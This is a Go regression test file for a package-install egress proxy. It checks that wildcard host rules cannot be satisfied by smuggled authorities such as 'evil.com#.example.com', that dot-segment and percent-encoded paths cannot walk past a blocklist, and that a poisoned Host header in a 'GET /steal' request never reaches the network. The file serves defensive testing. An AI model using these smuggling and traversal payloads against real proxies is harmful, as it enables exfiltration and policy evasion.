package main

// Regressions for the two bypasses that lived in the gap between what the policy MATCHED and what
// the origin RESOLVED. Both were reachable from a package install script, and neither needed
// anything more exotic than a Host header and a request line.

import (
	"bufio"
	"context"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
)

// mustHost extracts the hostname from a `host:port` the way the proxy does, failing the test rather
// than silently handing a policy an authority it will refuse.
func mustHost(t *testing.T, authority string) string {
	t.Helper()
	h, _, ok := splitAuthority(authority)
	if !ok {
		t.Fatalf("test setup: %q is not a usable authority", authority)
	}
	return h
}

// A `*.example.com` rule used to be a way out to anywhere: `evil.com#.example.com` ends in
// `.example.com`, so a suffix test permitted it, and `"https://" + host` then made `#` a fragment so
// the request went to evil.com. Every one of these must now be refused BEFORE it is a URL.
func TestWildcardRuleCannotBeSuffixedIntoAnotherHost(t *testing.T) {
	p := &Policy{Rules: []Rule{{Host: "*.example.com"}}}

	for _, host := range []string{
		"evil.com#.example.com",
		"evil.com?.example.com",
		"evil.com/.example.com",
		"evil.com\\.example.com",
		"evil.com@.example.com",
		"evil.com%23.example.com",
		"evil.com:8080#.example.com",
	} {
		if _, _, ok := splitAuthority(host); ok {
			t.Errorf("splitAuthority(%q) accepted an authority that is not a host", host)
		}
		if d := p.CheckTunnel(host); d.Allow {
			t.Errorf("CheckTunnel(%q) = allow; a wildcard rule must not be satisfiable by a URL delimiter", host)
		}
		if d := p.Check(host, "GET", "/x"); d.Allow {
			t.Errorf("Check(%q) = allow; want refused", host)
		}
	}

	// The rule still has to work for what it is actually for.
	for _, host := range []string{"a.example.com", "a.b.example.com", "A.Example.Com", "a.example.com."} {
		if d := p.CheckTunnel(host); !d.Allow {
			t.Errorf("CheckTunnel(%q) = deny; a legitimate subdomain must still pass", host)
		}
	}
	// And still must not open the apex.
	if d := p.CheckTunnel("example.com"); d.Allow {
		t.Error("a *.example.com rule must not open the apex")
	}
}

// The trailing root dot names the same host to DNS, so a blocklist entry has to catch it. Before
// canonicalisation `evil.com.` matched nothing at all — harmless against a permit, which fails
// closed, but a free pass around a block.
func TestTrailingRootDotIsTheSameHost(t *testing.T) {
	p := &Policy{
		Rules:   []Rule{{Host: "registry.npmjs.org"}},
		Blocked: []Block{{Host: "registry.npmjs.org", Reason: "blocked"}},
	}
	if d := p.CheckTunnel("registry.npmjs.org."); d.Allow {
		t.Error("a trailing root dot must not walk past the blocklist")
	}
}

func TestSplitAuthorityAcceptsRealAuthorities(t *testing.T) {
	cases := []struct{ in, host, port string }{
		{"registry.npmjs.org", "registry.npmjs.org", ""},
		{"registry.npmjs.org:8443", "registry.npmjs.org", "8443"},
		{"REGISTRY.NPMJS.ORG", "registry.npmjs.org", ""},
		{"registry.npmjs.org.", "registry.npmjs.org", ""},
		{"10.0.0.1:5000", "10.0.0.1", "5000"},
		{"[::1]:443", "::1", "443"},
		{"[::1]", "::1", ""},
		{"my_registry.internal:8080", "my_registry.internal", "8080"},
	}
	for _, c := range cases {
		h, p, ok := splitAuthority(c.in)
		if !ok || h != c.host || p != c.port {
			t.Errorf("splitAuthority(%q) = (%q,%q,%v), want (%q,%q,true)", c.in, h, p, ok, c.host, c.port)
		}
	}
	for _, bad := range []string{"", "   ", "-leading.example.com", "trailing-.example.com", "a..b.com",
		"registry.npmjs.org:http", "registry.npmjs.org:99999999", "1.2.3.4:80:90", "host name.com"} {
		if _, _, ok := splitAuthority(bad); ok {
			t.Errorf("splitAuthority(%q) accepted a malformed authority", bad)
		}
	}
}

// The blocklist is the product. It used to be walked past by any spelling of the same path that the
// origin would normalise but the guard would not.
func TestBlocklistSurvivesPathSpellings(t *testing.T) {
	p := &Policy{
		Rules:   []Rule{{Host: "registry.npmjs.org"}},
		Blocked: []Block{{Host: "registry.npmjs.org", PathGlobs: []string{"/left-pad/-/left-pad-1.3.0.tgz"}, Reason: "compromised"}},
	}
	for _, raw := range []string{
		"/left-pad/-/left-pad-1.3.0.tgz",
		"//left-pad/-/left-pad-1.3.0.tgz",
		"/left-pad/-/./left-pad-1.3.0.tgz",
		"/left-pad/./-/left-pad-1.3.0.tgz",
		"/left-pad/-/x/../left-pad-1.3.0.tgz",
		"/left-pad/-/x/%2e%2e/left-pad-1.3.0.tgz",
		"/x/../left-pad/-/left-pad-1.3.0.tgz",
		"/left-pad/-/%6ceft-pad-1.3.0.tgz",
		"/left-pad///-//left-pad-1.3.0.tgz",
	} {
		_, match, ok := cleanPath(raw)
		if !ok {
			t.Errorf("cleanPath(%q) refused a decodable path", raw)
			continue
		}
		if d := p.Check("registry.npmjs.org", "GET", match); d.Allow {
			t.Errorf("%q reached the blocked tarball (matched as %q)", raw, match)
		}
	}
}

// The mirror of the same bug: a path prefix must not be widened by a dot segment that the origin
// resolves back out of the prefix.
func TestPathPrefixIsNotWidenedByDotSegments(t *testing.T) {
	p := &Policy{Rules: []Rule{{Host: "corp.example", PathPrefixes: []string{"/safe/"}}}}
	for _, raw := range []string{
		"/safe/../secret",
		"/safe/%2e%2e/secret",
		"/safe/./../../secret",
		"/safe/a/../../secret",
	} {
		forward, match, ok := cleanPath(raw)
		if !ok {
			t.Errorf("cleanPath(%q) refused a decodable path", raw)
			continue
		}
		if d := p.Check("corp.example", "GET", match); d.Allow {
			t.Errorf("%q escaped the /safe/ prefix (matched as %q, would send %q)", raw, match, forward)
		}
	}
	// What the prefix is for still works, trailing slash and all.
	for _, raw := range []string{"/safe/", "/safe/pkg.tgz", "/safe/./pkg.tgz", "/safe//pkg.tgz"} {
		_, match, _ := cleanPath(raw)
		if d := p.Check("corp.example", "GET", match); !d.Allow {
			t.Errorf("%q should be permitted by the /safe/ prefix, matched as %q", raw, match)
		}
	}
}

// The rule the whole file exists to enforce: whatever the policy decided on is what goes upstream.
func TestForwardedPathIsTheMatchedPath(t *testing.T) {
	cases := []struct{ raw, forward, match string }{
		{"/a//b", "/a/b", "/a/b"},
		{"/a/./b", "/a/b", "/a/b"},
		{"/a/x/../b", "/a/b", "/a/b"},
		{"/a/%2e%2e/b", "/b", "/b"},
		{"/safe/", "/safe/", "/safe/"},
		{"/safe/.", "/safe/", "/safe/"},
		{"", "/", "/"},
		// Percent-encoding is preserved on the wire and decoded for matching. npm addresses a
		// scoped package this way and a presigned URL signs its own escaping, so re-encoding
		// either would break a real build.
		{"/@scope%2fpkg", "/@scope%2fpkg", "/@scope/pkg"},
		{"/%7Euser/file", "/%7Euser/file", "/~user/file"},
	}
	for _, c := range cases {
		forward, match, ok := cleanPath(c.raw)
		if !ok {
			t.Errorf("cleanPath(%q) refused", c.raw)
			continue
		}
		if forward != c.forward || match != c.match {
			t.Errorf("cleanPath(%q) = (%q,%q), want (%q,%q)", c.raw, forward, match, c.forward, c.match)
		}
		// And the URL actually built from the pair must carry the forward form verbatim.
		u := upstreamURL("https", "registry.npmjs.org", "443", forward, match, "")
		if got := u.EscapedPath(); got != forward {
			t.Errorf("upstreamURL for %q sends %q, but the policy decided on %q", c.raw, got, forward)
		}
	}
}

// Malformed percent-encoding is refused rather than guessed at: it is the raw material for making
// two parsers disagree, and no package manager emits it.
func TestUndecodablePathIsRefused(t *testing.T) {
	for _, raw := range []string{"/a/%zz", "/%", "/a/%2"} {
		if _, _, ok := cleanPath(raw); ok {
			t.Errorf("cleanPath(%q) accepted invalid percent-encoding", raw)
		}
	}
}

// upstreamURL must never produce a URL whose host is not the host that was checked.
func TestUpstreamURLCannotBeRepointed(t *testing.T) {
	u := upstreamURL("https", "registry.npmjs.org", "", "/pkg", "/pkg", "a=1")
	if u.Host != "registry.npmjs.org" {
		t.Fatalf("host = %q", u.Host)
	}
	// Re-parsing what we emit must land on the same host — no fragment, no userinfo, no second
	// reading of the string.
	back, err := url.Parse(u.String())
	if err != nil || back.Host != "registry.npmjs.org" {
		t.Fatalf("round-trip of %q gave host %q (err %v)", u.String(), back.Host, err)
	}
	if strings.ContainsAny(u.Host, "#?/@\\") {
		t.Fatalf("host %q contains a URL delimiter", u.Host)
	}
	// An IPv6 literal has to come back bracketed, or it is not a URL at all.
	if got := upstreamURL("https", "::1", "8443", "/x", "/x", "").String(); got != "https://[::1]:8443/x" {
		t.Errorf("IPv6 upstream URL = %q", got)
	}
	// The scheme's own port is not carried into the Host header.
	if got := upstreamURL("https", "registry.npmjs.org", "443", "/x", "/x", "").Host; got != "registry.npmjs.org" {
		t.Errorf("default port should be dropped, got %q", got)
	}
	if got := upstreamURL("https", "registry.npmjs.org", "8443", "/x", "/x", "").Host; got != "registry.npmjs.org:8443" {
		t.Errorf("non-default port must be kept, got %q", got)
	}
}

// --- end to end, through the real tunnel ------------------------------------------------------

// dialRecorder is how this file proves a refusal: not by reading a status code, but by showing that
// nothing was ever dialled. A 403 that still opened a connection to the attacker's host would have
// leaked the request it was refusing.
type dialRecorder struct {
	mu    sync.Mutex
	addrs []string
}

func (d *dialRecorder) dial(ctx context.Context, network, addr string) (net.Conn, error) {
	d.mu.Lock()
	d.addrs = append(d.addrs, addr)
	d.mu.Unlock()
	return nil, errors.New("upstream dialling is disabled in this test")
}

func (d *dialRecorder) seen() []string {
	d.mu.Lock()
	defer d.mu.Unlock()
	return append([]string(nil), d.addrs...)
}

// tunnelTo opens a CONNECT tunnel through the proxy and completes the TLS handshake inside it,
// returning the connection the build would be writing its requests onto.
func tunnelTo(t *testing.T, proxyAddr, authority string, caPEM []byte) *tls.Conn {
	t.Helper()
	raw, err := net.Dial("tcp", proxyAddr)
	if err != nil {
		t.Fatalf("dialling the proxy: %v", err)
	}
	t.Cleanup(func() { raw.Close() })

	fmt.Fprintf(raw, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", authority, authority)
	br := bufio.NewReader(raw)
	res, err := http.ReadResponse(br, &http.Request{Method: http.MethodConnect})
	if err != nil {
		t.Fatalf("reading the CONNECT response: %v", err)
	}
	if res.StatusCode != http.StatusOK {
		t.Fatalf("CONNECT returned %d, want 200", res.StatusCode)
	}

	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(caPEM) {
		t.Fatal("the guard CA did not parse as PEM")
	}
	host, _, _ := splitAuthority(authority)
	tc := tls.Client(raw, &tls.Config{RootCAs: pool, ServerName: host})
	if err := tc.Handshake(); err != nil {
		t.Fatalf("TLS handshake inside the tunnel: %v", err)
	}
	t.Cleanup(func() { tc.Close() })
	return tc
}

// The exfiltration channel, end to end.
//
// A build opens a tunnel to a host its policy permits — which a malicious postinstall is perfectly
// entitled to do — and then writes a request whose Host header names somewhere else. Before this
// was fixed, a `*.example.com` rule accepted `evil.com#.example.com` on a suffix test and the
// upstream URL, built by concatenation, resolved the `#` as a fragment and went to evil.com.
//
// The assertion is not the status code. It is that the proxy never dialled anything.
func TestPoisonedHostHeaderNeverReachesTheNetwork(t *testing.T) {
	ca, err := newCertAuthority()
	if err != nil {
		t.Fatal(err)
	}
	rec := &dialRecorder{}
	px := newProxy(&Policy{Version: 7, Rules: []Rule{{Host: "*.example.com"}}}, ca, nil, false)
	px.upstream.DialContext = rec.dial
	px.upstream.DialTLSContext = rec.dial

	srv := httptest.NewServer(px)
	defer srv.Close()
	proxyAddr := strings.TrimPrefix(srv.URL, "http://")

	for _, poisoned := range []string{
		"evil.com#.example.com",
		"evil.com?.example.com",
		"evil.com/.example.com",
		"evil.com@.example.com",
		"evil.com:8443#.example.com",
	} {
		conn := tunnelTo(t, proxyAddr, "pkgs.example.com:443", ca.caPEM())
		fmt.Fprintf(conn, "GET /steal HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", poisoned)

		res, err := http.ReadResponse(bufio.NewReader(conn), nil)
		if err != nil {
			t.Fatalf("Host %q: reading the response: %v", poisoned, err)
		}
		body, _ := io.ReadAll(io.LimitReader(res.Body, 4096))
		res.Body.Close()

		if res.StatusCode != http.StatusForbidden {
			t.Errorf("Host %q: got %d, want 403 — body %q", poisoned, res.StatusCode, body)
		}
	}

	if dialled := rec.seen(); len(dialled) != 0 {
		t.Fatalf("a refused request still reached the network: dialled %v", dialled)
	}
}

// The other half of the same story: a request the policy really does permit must still be attempted,
// or the test above would pass on a proxy that had simply stopped working.
func TestPermittedRequestStillReachesTheNetwork(t *testing.T) {
	ca, err := newCertAuthority()
	if err != nil {
		t.Fatal(err)
	}
	rec := &dialRecorder{}
	px := newProxy(&Policy{Version: 7, Rules: []Rule{{Host: "*.example.com"}}}, ca, nil, false)
	px.upstream.DialContext = rec.dial
	px.upstream.DialTLSContext = rec.dial

	srv := httptest.NewServer(px)
	defer srv.Close()

	conn := tunnelTo(t, strings.TrimPrefix(srv.URL, "http://"), "pkgs.example.com:443", ca.caPEM())
	// `/a/./b` on the way in must arrive at the origin as the `/a/b` the policy decided on.
	fmt.Fprintf(conn, "GET /a/./b HTTP/1.1\r\nHost: pkgs.example.com\r\nConnection: close\r\n\r\n")
	res, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		t.Fatalf("reading the response: %v", err)
	}
	res.Body.Close()
	// The dial is stubbed to fail, so a 502 is the success case here: it means we got as far as
	// trying to reach the origin.
	if res.StatusCode != http.StatusBadGateway {
		t.Errorf("permitted request got %d, want 502 from the stubbed dialler", res.StatusCode)
	}
	dialled := rec.seen()
	if len(dialled) != 1 || dialled[0] != "pkgs.example.com:443" {
		t.Fatalf("dialled %v, want exactly [pkgs.example.com:443]", dialled)
	}
}

// End to end over real TLS: the blocklist must hold against a dodged path, and the origin must
// receive exactly the path the policy decided on — not the raw one it was asked for.
func TestOriginReceivesTheNormalisedPath(t *testing.T) {
	var got atomic.Value
	origin := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got.Store(r.URL.EscapedPath())
		w.Write([]byte("ok"))
	}))
	defer origin.Close()

	root := x509.NewCertPool()
	root.AddCert(origin.Certificate())
	host := mustHost(t, strings.TrimPrefix(origin.URL, "https://"))

	p := &Policy{
		Version: 9,
		Rules:   []Rule{{Host: host}},
		Blocked: []Block{{
			Host:      host,
			PathGlobs: []string{"/left-pad/-/left-pad-1.3.0.tgz"},
			Reason:    "left-pad 1.3.0 is on your organization's blocklist",
		}},
	}
	client, stop := startProxy(t, p, root)
	defer stop()

	// Every spelling of the blocked tarball is still the blocked tarball.
	for _, dodge := range []string{
		"/left-pad/-/left-pad-1.3.0.tgz",
		"/left-pad/-/./left-pad-1.3.0.tgz",
		"//left-pad/-/left-pad-1.3.0.tgz",
		"/left-pad/-/x/../left-pad-1.3.0.tgz",
		"/left-pad/-/%6ceft-pad-1.3.0.tgz",
	} {
		code, body := get(t, client, origin.URL+dodge)
		if code != 403 {
			t.Errorf("%s: got %d, want 403 — body %q", dodge, code, body)
		}
	}

	// And a permitted request arrives normalised, so the origin resolves what was approved.
	if code, _ := get(t, client, origin.URL+"/pkg/-/./wanted.tgz"); code != 200 {
		t.Fatalf("permitted request got %d, want 200", code)
	}
	if p := got.Load(); p != "/pkg/-/wanted.tgz" {
		t.Errorf("origin received %q, want the normalised %q", p, "/pkg/-/wanted.tgz")
	}
}
